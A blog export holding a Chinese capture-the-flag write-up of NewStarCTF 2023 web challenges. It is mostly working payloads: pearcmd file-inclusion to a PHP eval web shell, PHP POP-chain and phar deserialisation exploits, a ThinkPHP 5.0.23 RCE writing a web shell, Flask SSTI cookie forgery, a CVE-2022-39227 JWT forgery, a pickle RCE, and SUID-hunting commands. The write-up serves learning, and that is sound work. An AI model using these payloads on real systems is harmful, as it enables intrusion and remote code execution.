{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"NewstarCTF2023","slug":"NewstarCTF2023","date":"2023-12-04T13:00:00.000Z","updated":"2023-12-04T13:23:56.724Z","comments":true,"path":"2023/12/04/NewstarCTF2023/","permalink":"http://example.com/2023/12/04/NewstarCTF2023/","excerpt":"","text":"NewstarCTF2023——Jednersaous WEB-week3include pear这道题是我没见过的，本来一开始还没意识到题那个梨的emoji是什么意思，后来才恍然大悟 12345678910111213141516&lt;?php error_reporting(0); if(isset($_GET[&#x27;file&#x27;])) &#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123; die(&#x27;hacker!&#x27;); &#125; include($file.&quot;.php&quot;); # Something in phpinfo.php! &#125; else &#123; highlight_file(__FILE__); &#125;?&gt; 看到include第一反应应该是php伪协议，但是后面限制了文件后缀，其实过不过滤也差不多？除非又能把后面的.php给无效了 题目说phpinfo.php里有东西，结果找到个fakeflag&#x3D; fake{Check_register_argc_argv} 打开源码Ctrl+f 开搜，发现register_argc_argv&#x3D;1，好，那么好，又得浏览器开搜了（没见过啊 找到了LFI,RCE,pearcmd等好多东西 参考连接: https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/ https://blog.csdn.net/qq_50643984/article/details/126598547 甚至有去年Newstar的同类型题？？？（绷 https://blog.csdn.net/weixin_53090346/article/details/127241278 但我搜了是搜了，确实是没理解，什么LFI to RCE云云，确实是没太懂 payload: 1http:靶机ip?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1])?&gt;+/var/www/html/a.php Pay attetion here:一定要用Burp传这个payload,不然在url里传会被直接转义，然后gg 传payload之后，会在默认开启web服务的文件夹下新建一个a.php，其中有你传入的代码，传入成功是有回显的 随后就可以打开http:靶机ip&#x2F;a.php 然后hackbar传参给1这个变量，可以看到这个是不出网的，不用拿shell 直接1&#x3D;system(‘cat &#x2F;flag’);这个&#x2F;flag在题目源码中有暗示 虽然没懂，但是涨知识了（？ 至少我知道了这个代码怎么工作，那些巨擘们是完全理解了之后才能写出这样的payload的话 那也太恐怖了…… —————————————————————————————————————————— medium_sql稍微开了下环境做了下，由于我没看wp不知道别人是怎么做的，但我从上一题沿用的盲注好像还是能行啊？ 盲注永远的神（？？？ 这次我一定写一个脚本来注（他妈的 没对大小写进行过滤 1234567payload:ASCII(SUBSTR((SELECT table_name from INFORMATION_schema.`TABLES` Where table_schema = database() limit 0,1),1,1))length(SELECT table_name from INFORMATION_schema.`TABLES` Where table_schema = database() limit 0,1)&gt;=3ASCII(SUBSTR((SELECT column_name from INFORMATION_schema.`COLUMNS` Where table_name=&#x27;grades&#x27; limit 0,1),1,1))ASCII(SUBSTR((SELECT column_name from INFORMATION_schema.`COLUMNS` Where table_name=&#x27;here_is_flag&#x27; limit 0,1),1,1)) 用我这个没问题（笑 偷懒—————————————————————————————————————— ###POP Gadget 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phphighlight_file(__FILE__);class Begin&#123; public $name; public function __destruct() &#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123; echo &quot;Hello&quot;; &#125;else&#123; echo &quot;Welcome to NewStarCTF 2023!&quot;; &#125; &#125;&#125;class Then&#123; private $func; public function __toString() &#123; ($this-&gt;func)(); return &quot;Good Job!&quot;; &#125;&#125;class Handle&#123; protected $obj; public function __call($func, $vars) &#123; $this-&gt;obj-&gt;end(); &#125;&#125;class Super&#123; protected $obj; public function __invoke() &#123; $this-&gt;obj-&gt;getStr(); &#125; public function end() &#123; die(&quot;==GAME OVER==&quot;); &#125;&#125;class CTF&#123; public $handle; public function end() &#123; unset($this-&gt;handle-&gt;log); &#125;&#125;class WhiteGod&#123; public $func; public $var; public function __unset($var) &#123; ($this-&gt;func)($this-&gt;var); &#125;&#125;@unserialize($_POST[&#x27;pop&#x27;]); 我对于php序列化和反序列化的认知还停留在十分简单的阶段，这题确实是给了我当头一棒，我也认识到了什么是POP链 参考:https://www.cnblogs.com/th0r/p/14152102.html https://www.php.net/manual/zh/language.oop5.magic.php 首先对源码做一下分析: 直接看最后，定义了两个可以传入的参数$func,$var，还有个__unset函数里面调用了如下式子 1($this-&gt;func)($this-&gt;var) 看起来就很像能够执行system命令的样子 看到WhiteGod类调用了__unset魔术方法，php官网的解释是 当对不可访问（protected 或 private）或不存在的属性调用unset()时， __unset会被调用 回到源码中去找哪里调用了unset()函数，可以看到CTF类调用了unset 且unset传入的参数是$this-&gt;handle-&gt;log，handle有定义可控，但是log又是什么属性呢（？ 暂时先不管，总之是要把handle设置为new WhiteGod()以便能调用__unset 其实正是对未定义的属性调用了unset()，所以才会触发__unset，因此没必要考虑log是什么，就是个未定义量 回到CTF类，调用unset的定义函数是end()，我们要在注入POP链后执行end函数，那么应该从哪里去找调用$CTF.end()的地方呢 可以看到Handle类中有魔术方法__call,php官网的解释是 在对象中调用一个不可访问方法时，__call会被调用 显然Handle类中的protected $obj应该就是一个CTF类，这样便可以调用end()方法 可以发现Super类中有魔术方法__invoke，php官网的解释是 当尝试以调用函数的方式调用一个对象时，__invoke方法会被自动调用 所以我们只需要找到形如$object()这样的表达式，最后发现Then类调用了($this-&gt;func)()，所以 ($this-&gt;func)应为一个Super类，但是要触发($this-&gt;func)()，必须先触发__toString魔术方法，php官网的解释是 __toString方法用于一个类被当成字符串时应怎样回应 最经典的就是echo，print等函数，在这道题目中，我们可以发现Begin的__destruct魔术方法调用了preg_match 这是一个经典的字符串处理函数，所以只需要保证$this-&gt;name是我传入的一个Then类即可 综合上述，我们已经可以得到一条逻辑链 12345Begin:$this-&gt;name ---------&gt; ThenThen:$this-&gt;func ---------&gt; SuperSuper:$this-&gt;obj ---------&gt; HandleHandle:$this-&gt;obj ---------&gt; CTFCTF:$this-&gt;handle ---------&gt; WhiteGod Pay attention: 值得注意的是，在php序列化过程中，对于public,protected,private变量的序列化有所不同 对于public变量是直接var_dump()，没有加任何的保护 对于protected变量，假设protected $a&#x3D;’123’，那么序列化之后就是s:6:%00%00123，我将其与public变量序列化不同的部分加粗，所以在传参的时候最好使用burp，在Hex栏中在号的前后补上hex(00)，以充当%00 对于private变量，假设protected $a&#x3D;’123’，且类名为number，那么序列化之后就是s:11:%00number%00123，在php-echo预览出来的效果是没有%00的，就是类名加上数据，传参同protected 其次需要用得到一些OOP的思想，首先我们明确一点:protected和private变量在类外部是不可写的 所以在写poc的时候，不能用$a-&gt;protected variable来修改其值，而是得在类的内部重新写一个public方法 用这个public方法来修改protected或者private变量的值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748poc:&lt;?phpclass Begin&#123; public $name;&#125;class Then&#123; private $func; public function construct($k) &#123; $this-&gt;func=$k; &#125;&#125;class Handle&#123; protected $obj; public function construct($k) &#123; $this-&gt;obj=$k; &#125;&#125;class Super&#123; protected $obj; public function construct($k)&#123; $this-&gt;obj=$k; &#125;&#125;class CTF&#123; public $handle;&#125;class WhiteGod&#123; public $func=&#x27;var_dump&#x27;; public $var=&#x27;666&#x27;;&#125;$a= new Begin();$b=new Then();$c=new Super();$d=new Handle();$e=new CTF();$f=new WhiteGod();$e-&gt;handle=$f;$d-&gt;construct($e);$c-&gt;construct($d);$b-&gt;construct($c);$a-&gt;name=$b;echo serialize($a); 传参用burp然后修改hex就可^ _ ^ —————————————————————————————————————————————————— R!!!C!!!E!!!123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);class minipop&#123; public $code; public $qwejaskdjnlka; public function __toString() &#123; if(!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code))&#123; exec($this-&gt;code); &#125; return &quot;alright&quot;; &#125; public function __destruct() &#123; echo $this-&gt;qwejaskdjnlka; &#125;&#125;if(isset($_POST[&#x27;payload&#x27;]))&#123; //wanna try? unserialize($_POST[&#x27;payload&#x27;]);&#125; 确实是minipop，先处理POP链，要调用__toString魔术方法中的exec()方法，我们要把一个类当做字符串来处理，看到minipop类中__destruct魔术方法中有echo，那懂了啊，就是把$this-&gt;qwejaskdjnlka变成上面提到的类就行了，虽然这两个类是一样的，但是问题不大 再回到__toString里的exec()，可以看到exec($this-&gt;code)，所以说我们传入给qwe属性的这个类要写入能够RCE的code属性，至于外层minipop类的code属性可以不管，同时内层minpop类的qwe属性也可以不管 接下来就是如何RCE然后读文件或者下载什么的 首先要明确exec()和system()的区别 exec是没有回显的，除非传多个参数，那么会将第一个参数的内容存入第二个参数中，所以ls不会返回到页面上 而且exec失败的话会报错，对于查看是否成功RCE很友好 可以传code属性为sleep 3，这样可以让相应延迟3秒，也能查看是否成功RCE 看一下preg_match，嗯，能过滤的都过滤了，但是没有过滤单双引号，可能如果过滤了就传不了序列化对象了？ 那就很好绕过了，对于php的preg_match，毕竟是php的东西，要过滤linux的智能匹配可太难了 比如ba””se,ex””ec,py””thon,这些都是可以执行的，翻解法的时候看到了tee方法，很好用，用了之后确实很好用 所以就用te””e来代替传入code属性中的tee就行了 参考: https://www.php.net/manual/zh/function.exec.php https://blog.csdn.net/Kracxi/article/details/121997166 123456789101112131415161718192021222324exp:&lt;?phphighlight_file(__FILE__);class minipop&#123; public $code; public $qwejaskdjnlka; public function __toString() &#123; if(!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code))&#123; exec($this-&gt;code); &#125; return &quot;alright&quot;; &#125; public function __destruct() &#123; echo $this-&gt;qwejaskdjnlka; &#125;&#125;$a=new minipop();//$a-&gt;code=&#x27;ls | te&quot;&quot;e 1&#x27;;//$a-&gt;code=&#x27;cat /flag_is_h3eeere | te&quot;&quot;e 2&#x27;;$b=new minipop();$b-&gt;qwejaskdjnlka=$a;echo serialize($b); 拿到序列化后的值用hackbar传post参数就行 12payload1:O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:12:&quot;ls | te&quot;&quot;e 1&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125; 先传入第一个payload1，然后可以访问&#x2F;1页面，就能看到ls输出的返回值，如果没有flag就多试几次cd和ls （一般不会为难人 12payload2:O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:30:&quot;cat /flag_is_h3eeere | te&quot;&quot;e 2&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125; 发现flag_is_h3eere在根目录下，直接cat就行了，用tee下载到&#x2F;2页面上 访问&#x2F;2页面就能拿到flag —————————————————————————————————————————————————— WEB-week4###逃 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);function waf($str)&#123; return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123; public $key; public $cmd = &quot;whoami&quot;; public function __construct($key) &#123; $this-&gt;key = $key; &#125; public function __destruct() &#123; system($this-&gt;cmd); &#125;&#125;unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); 可以看到页面显示system(‘whoami’)的结果被打印了两次，第一次是在定义一个新的GetFlag类的时候，调用了__destruct()魔术方法，会自动执行system函数并回显到浏览器上 第二次是反序列化的时候，相当于将传入的序列化后的GetFlag类重新变成GetFlag类，也会调用__construct()和__destruct() 首先分析一个单独的GetFlag类，明显可以看出我们可控的变量仅有$key,而$cmd是我们无法控制的 单纯修改$key的值几乎没什么用，所以可能需要多个类来形成POP链 但是很显然，我$_GET[‘key’]传入的key值不可能是个类型，所以也没法传入一个类了 看到str_replace，把所有bad换成good，每换一次字符长度+1，但是序列化后字符长度值不变， 那就&#x3D;Moe~夺命十三枪，不难，构造一下Payload吧 12345678910Payload:need:&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;badbad...bad...==needbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;bad -15Final:key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125; //index.php --22*good-&gt;88key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125; —————————————————————————————————————————————————— More Fast12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phphighlight_file(__FILE__);class Start&#123; public $errMsg; public function __destruct() &#123; die($this-&gt;errMsg); &#125;&#125;class Pwn&#123; public $obj; public function __invoke()&#123; $this-&gt;obj-&gt;evil(); &#125; public function evil() &#123; phpinfo(); &#125;&#125;class Reverse&#123; public $func; public function __get($var) &#123; ($this-&gt;func)(); &#125;&#125;class Web&#123; public $func; public $var; public function evil() &#123; if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123; ($this-&gt;func)($this-&gt;var); &#125;else&#123; echo &quot;Not Flag&quot;; &#125; &#125;&#125;class Crypto&#123; public $obj; public function __toString() &#123; $wel = $this-&gt;obj-&gt;good; return &quot;NewStar&quot;; &#125;&#125;class Misc&#123; public function evil() &#123; echo &quot;good job but nothing&quot;; &#125;&#125;$a = @unserialize($_POST[&#x27;fast&#x27;]);throw new Exception(&quot;Nope&quot;); 又双叒是POP链题，恼（ 123456Start.errMsg=Crypto //Crypto之__toStringCrypto.obj=Reverse //Reverse之__getReverse.func=Pwn //Pwn之__invokePwn.obj=Web or Misc ?? //Web&amp;Misc之evil()Web.func=&#x27;system&#x27;Web.var=&#x27;ls&#x27; 恼，不做了（\\ud83d\\ude21） —————————————————————————————————————————————————— midsql123$cmd = &quot;select name, price from items where id = &quot;.$_REQUEST[&quot;id&quot;];$result = mysqli_fetch_all($result);$result = $result[0]; 粗试了一下，发现过滤了空格和&#x3D; 而且这压根就没有执行任何有效的sql嘛，只有result的莫名嵌套，所以是不会有任何结果的 传入的是个字符型变量，但是检测应该是发生在拼接语句之前的，所以照理应该是可以执行id里的php语法 直接打个sleep(2)进去，网页直接开睡，原来直接RCE就行了（？ 就是好像没有回显，所以这…难不成是要拿shell嘛，但是呢好像有点不太对，因为堆叠用不了 比如1;sleep(1)网页是不睡的，所以得重新审视一下逻辑 12-1/**/or/**/sleep(2)1/**/&amp;&amp;/**/sleep(2) 以上POC均不行，要不就是输进去就network-err 我懂了，我发现sleep(1);sleep(1)也不会让网页睡觉，所以只有当id是个可执行的短语句（不能有分号）才会执行 —————————————————————————————————————————————————— Injectme目录穿越先拿源码，密钥未知试试读取一下config，没想到确实有（其实没有就做不下去了 1secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; ezSSTI（wrong 12345678910111213141516171819202122232425262728293031323334import requestsimport osimport syssys.path.append(r&#x27;C:\\Users\\Jednersaous\\Desktop\\web-test\\build\\flasksessioncookiemanagermaster&#x27;)import flask_session_cookie_manager3# cookie_structure = &quot;&#123;&#x27;user&#x27;: \\&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()) %&#125;\\&quot;&#125;&quot;# secret = &#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;# payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)# print(payload)#find os# url=&#x27;http://17accd58-671d-4091-b453-94dff0b6c092.node4.buuoj.cn:81/backdoor&#x27;# for j in range(150):# cookie_structure = &quot;&#123;&#x27;user&#x27;: \\&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()) %&#125;\\&quot;&#125;&quot;# a=&#x27;[%d]&#x27; % j# cookie_structure=cookie_structure[0:84]+a+cookie_structure[84:100]# secret = &#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;# payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)# print(payload)# cookiet=&#123;# &#x27;session&#x27;: payload# &#125;# a=requests.get(url=url, cookies=cookiet)# if &quot;os&quot; in a.text:# print(a.text)# print(j)cookie_structure = &quot;&#123;&#x27;user&#x27;: \\&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[117][&#x27;_&#x27;&#x27;_ini&#x27;&#x27;t_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ca&#x27;&#x27;t /y0U3_f14g_1s_h3re&#x27;)[&#x27;read&#x27;]()) %&#125;\\&quot;&#125;&quot; #tailprint(cookie_structure)secret = &#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)print(payload) —————————————————————————————————————————————————— PharOnephar反序列化，检测__HALT_COMPILER()，用gzip绕过 无回显rce，有写入权限，直接在/var/www/html下新写一个可以回显的:horse: 至于反弹shell，没成功，原因未知（（（ 12345678910111213&lt;?phpclass Flag&#123; public $cmd;&#125;$a = new Flag();$a-&gt;cmd=&quot;echo &#x27;&lt;?=system(\\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;;$phartest = new phar(&#x27;pharone.phar&#x27;,0);$phartest-&gt;startBuffering();$phartest-&gt;setMetadata($a);$phartest-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);$phartest-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);$phartest-&gt;stopBuffering();?&gt; —————————————————————————————————————————————————— OtenkiBoyWeek3OtenkiGirl的加强版，还是JavaScript原型链污染 主要分析routes/info.js,routes/submit.js,routes/_components/utils.js 可以发现utils.js中的mergeJSON()函数仍然是一个递归的可浅可深的拷贝，但是过滤了__proto__ 那么可以用&#123;&#39;constructor&#39;:&#123;&#39;prototype&#39;:&#39;&#39;&#125;&#125;来绕过，这两者是等价的 其余的剩下再打 —————————————————————————————————————————————————— WEB-week5Unserialize Again1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phphighlight_file(__FILE__);error_reporting(0); class story&#123; private $user=&#x27;admin&#x27;; public $pass; public $eating; public $God=&#x27;false&#x27;; public function __wakeup()&#123; $this-&gt;user=&#x27;human&#x27;; if(1==1)&#123; die(); &#125; if(1!=1)&#123; echo $fffflag; &#125; &#125; public function __construct()&#123; $this-&gt;user=&#x27;AshenOne&#x27;; $this-&gt;eating=&#x27;fire&#x27;; die(); &#125; public function __tostring()&#123; return $this-&gt;user.$this-&gt;pass; &#125; public function __invoke()&#123; if($this-&gt;user==&#x27;admin&#x27;&amp;&amp;$this-&gt;pass==&#x27;admin&#x27;)&#123; echo $nothing; &#125; &#125; public function __destruct()&#123; if($this-&gt;God==&#x27;true&#x27;&amp;&amp;$this-&gt;user==&#x27;admin&#x27;)&#123; system($this-&gt;eating); &#125; else&#123; die(&#x27;Get Out!&#x27;); &#125; &#125;&#125; if(isset($_GET[&#x27;pear&#x27;])&amp;&amp;isset($_GET[&#x27;apple&#x27;]))&#123; // $Eden=new story(); $pear=$_GET[&#x27;pear&#x27;]; $Adam=$_GET[&#x27;apple&#x27;]; $file=file_get_contents(&#x27;php://input&#x27;); file_put_contents($pear,urldecode($file)); file_exists($Adam);&#125;else&#123; echo &#x27;多吃雪梨&#x27;;&#125; 多吃雪梨 一堆魔术方法都是骗人的，只有__destruct__有用，满足条件就能任意命令执行了，接下来是传参的部分 首先要明确file_get_contents(&#39;php://input&#39;)可以读取POST参数，但是呢会保留raw_data 比如说单单传入一个或多个字符是不行的，必须有a=123这样类似的形式，再看下一行 这个函数file_put_contents($pear,urldecode($file))表示将读到的数据urldecode之后写入以$pear命名的文件 所以会保留a=xxx这样子，可以自己在本地测试下，不过这个对于做题倒是无伤大雅，因为phar只会解析有用的 看到file_exist很明确是phar://打一个phar反序列化，就是文件写入有点麻烦，而且还要绕过__wakeup__ 浏览器抓包可以发现php版本是7.0.9，而php7.0.10就不能通过改变属性个数绕过__wakeup__了，所以这题还行 但是当你生成phar后再修改，那么phar的签名就无效了，必须得重新加密签名，详见下面的博客 https://www.cnblogs.com/CoLo/p/16786627.html 而且传文件得用python（我只会python，hackbar和burp全都寄，用open+read读bytes类型数据 然后用urllib.parse.quote将bytes数据给它url编码了，虽然说是只能传string类型，但其实可以自动转化的 POC: 1234567891011121314151617181920212223from hashlib import sha1import osimport requestsimport urllib.parseurll=&#x27;http://391ffc99-a75c-4ecd-baa4-edac1b638dff.node4.buuoj.cn:81/pairing.php&#x27;paramss=&#123; &#x27;pear&#x27;:&#x27;unsea.phar&#x27;, &#x27;apple&#x27;:&#x27;phar://unsea.phar&#x27;&#125;with open(&#x27;pharseax.phar&#x27;,&#x27;rb&#x27;) as file: f=file.read()s=f[:-28]h=f[-8:]newf = s + sha1(s).digest() + hwith open(&#x27;unsea.phar&#x27;,&#x27;wb&#x27;) as file: file.write(newf)with open(&#x27;unsea.phar&#x27;,&#x27;rb&#x27;) as fi: f=fi.read() ff=urllib.parse.quote(f) fin=requests.post(url=urll,data=ff,params=paramss) print(fin.text) —————————————————————————————————————————————————— FinalThinkphp-V5.0.23的RCE漏洞，但是照着网上搜到的抄是无结果的，因为system被disable了 1234567POST /index.php?s=captcha_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1##可以看到phpinfo里禁用了system_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;&lt;?php%20eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27;%20&gt;%20/var/www/public/1.php##写webshell，用蚁剑连接 到根目录之后想直接cat flag，但是没权限，姑且先搜下SUID，但是搜出来无回显，得写到txt里再读取 12find / -user root -perm -4000 -print 2&gt;/dev/null &gt; 1.txtcp /flag* /dev/stdout 看了writeup，没懂，打算看看SUID提权 SUID（Set User ID）是给予文件一个特殊类型的权限。具体作用就是把可执行程序所有者的权限赋予可执行程序，无论执行程序的是哪位用户，可执行程序都拥有它的所有者的权限，对于root的文件权限会由rwxr变为rwsr 设置了s位的程序在运行时，其Effective UID将会设置为这个程序的所有者 这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID Real UID 执行该进程的用户实际的UID； Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）; Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨） Real UID 执行该进程的用户实际的UID，谁通过shell运行就是谁 Effective UID 程序实际操作时生效的UID，一般在进程启动时，直接由Real UID复制而来；或者是当进程对应的可执行文件的suid标志位为s时，为该文件的所属用户&#x2F;组。所以利用suid文件进行提权需要2个前提：文件的所有者是 0 号或其他super user 文件拥有suid权限 0是root用户的UID 设置SUID权限 12chmod u+s filenamechmod u-s filename # 删除SUID权限 利用find命令找出linux系统上所有SUID的可执行文件 1234find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;ls -l /usr/bin 分析一下cp /flag* /dev/stdout 执行一个shell命令行时通常会自动打开三个标准文件： 标准输入文件（stdin），通常对应终端的键盘； 标准输出文件（stdout）和标准错误输出文件（stderr），这两个文件都对应终端的屏幕。 进程将从标准输入文件中得到输入数据，将正常输出数据输出到标准输出文件，而将错误信息送到标准错误文件中。所以stdout可以将输入的信息输出到终端上 —————————————————————————————————————————————————— Ye’s Pickle1234567891011121314151617181920212223242526272829303132333435363738# -*- coding: utf-8 -*-import base64import stringimport randomfrom flask import *import jwcrypto.jwk as jwkimport picklefrom python_jwt import *app = Flask(__name__)def generate_random_string(length=16): characters = string.ascii_letters + string.digits # 包含字母和数字 random_string = &#x27;&#x27;.join(random.choice(characters) for _ in range(length)) return random_stringapp.config[&#x27;SECRET_KEY&#x27;] = generate_random_string(16)key = jwk.JWK.generate(kty=&#x27;RSA&#x27;, size=2048)@app.route(&quot;/&quot;)def index(): payload=request.args.get(&quot;token&quot;) if payload: token=verify_jwt(payload, key, [&#x27;PS256&#x27;]) session[&quot;role&quot;]=token[1][&#x27;role&#x27;] return render_template(&#x27;index.html&#x27;) else: session[&quot;role&quot;]=&quot;guest&quot; user=&#123;&quot;username&quot;:&quot;boogipop&quot;,&quot;role&quot;:&quot;guest&quot;&#125; jwt = generate_jwt(user, key, &#x27;PS256&#x27;, timedelta(minutes=60)) return render_template(&#x27;index.html&#x27;,token=jwt)@app.route(&quot;/pickle&quot;)def unser(): if session[&quot;role&quot;]==&quot;admin&quot;: pickle.loads(base64.b64decode(request.args.get(&quot;pickle&quot;))) return render_template(&quot;index.html&quot;) else: return render_template(&quot;index.html&quot;)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 上来首先是要考虑一个jwt，用了之前没见过的库jwcrypto, python_jwk，页面会回显token 然而，SECRET_KEY和key的数量级过大，实在没法强行爆破，也没有任何关于他们的信息，所以到这里就卡住了 卡了半天，无奈只能看题解，结果是个CVE，没绷住，CVE-2022-39227，参考以下博客 https://forum.butian.net/share/1990 1234567891011121314151617181920212223import base64import stringimport randomfrom flask import *from json import *import jwcryptoimport jwcrypto.jwk as jwkimport picklefrom python_jwt import *key = jwk.JWK.generate(kty=&#x27;RSA&#x27;, size=2048)print(type(key))print(key)user=&#123;&quot;username&quot;:&quot;boogipop&quot;,&quot;role&quot;:&quot;guest&quot;&#125;jwt = generate_jwt(user, key, &#x27;PS256&#x27;, timedelta(minutes=60))print(jwt)jwt=&#x27;页面回显的token&#x27;[header, payload, signature] = jwt.split(&#x27;.&#x27;)parsed_payload = loads(base64url_decode(payload))print(parsed_payload)parsed_payload[&#x27;role&#x27;]=&quot;admin&quot;fakepayload=base64url_encode((dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))fakejwt=&#x27;&#123;&quot;&#x27; + header + &#x27;.&#x27; + fakepayload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27; print(fakejwt) 下一步就是pickle的问题，pickle嘛，是个新东西，先待我看看和整理一下 参考以下大神blog https://goodapple.top/archives/1069 https://xz.aliyun.com/t/11807 但是这道题单纯地用什么os.system(&#39;ls /&#39;)肯定出不来，因为没有回显，全是模板，那么无回显该怎么办呢 参考以下博客 https://www.cnblogs.com/sijidou/p/16305695.html 所以思路是这样： 随便定义一个类，再调用它的内置方法__reduce__，return一个tuple类型的对象，其中tuple[0]是可执行的内置函数，tuple[1]是给函数传入的字符串方法（一般是系统命令，然后再用pickle.dumps序列化这个随便定义的类就行了（一般是会base64加解密的 而这里因为没有回显，但是因为debug=True，所以可以通过控制台报错回显（（（太妙了 raise Exception()```括号内内置```__import__('os').system/popen.read()```就可以了12345678910111213141516最终payload:```pythonimport pickleimport base64import osclass Jex(): def __reduce__(self): return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flagggggggggggg&#x27;).read())&quot;,))def login(): poc = base64.b64encode(pickle.dumps(Jex())) print(poc)login() —————————————————————————————————————————————————— pppython?12345678910111213141516171819202122&lt;?php if ($_REQUEST[&#x27;hint&#x27;] == [&quot;your?&quot;, &quot;mine!&quot;, &quot;hint!!&quot;])&#123; header(&quot;Content-type: text/plain&quot;); system(&quot;ls / -la&quot;); exit(); &#125; try &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST[&#x27;lolita&#x27;]); $output = curl_exec($ch); echo $output; curl_close($ch); &#125;catch (Error $x)&#123; highlight_file(__FILE__); highlight_string($x-&gt;getMessage()); &#125;?&gt; curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value 先打一下hint，判断传入的hint等于一个数组，直接用hint[]传参就行 